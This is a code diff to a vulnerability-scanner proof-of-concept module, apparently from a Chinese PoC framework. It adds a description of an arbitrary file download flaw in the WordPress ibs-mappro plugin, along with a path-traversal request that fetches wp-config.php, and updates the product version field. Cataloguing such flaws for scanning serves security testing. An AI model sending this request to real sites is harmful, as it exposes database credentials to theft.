@@ -10,12 +10,14 @@ class Vuln(ABVuln):
     type = VulnType.FILE_DOWNLOAD # 漏洞类型
     disclosure_date = ''  # 漏洞公布时间
     desc = '''
+        WordPress ibs-mappro Plugin Arbitrary File Download Vulnerability.
+        /wp-content/plugins/ibs-mappro/lib/download.php?file=../../../../wp-config.php
     '''  # 漏洞描述
     ref = ''  # 漏洞来源
     cnvd_id = ''  # cnvd漏洞编号
     cve_id = ''  # cve编号
     product = 'WordPress'  # 漏洞应用名称
-    product_version = ''  # 漏洞应用版本
+    product_version = 'WordPress ibs-mappro Plugin'  # 漏洞应用版本
 
 class Poc(ABPoc):
     poc_id = 'e1c5f47c-84b8-4de2-be9a-a45eba497d01'
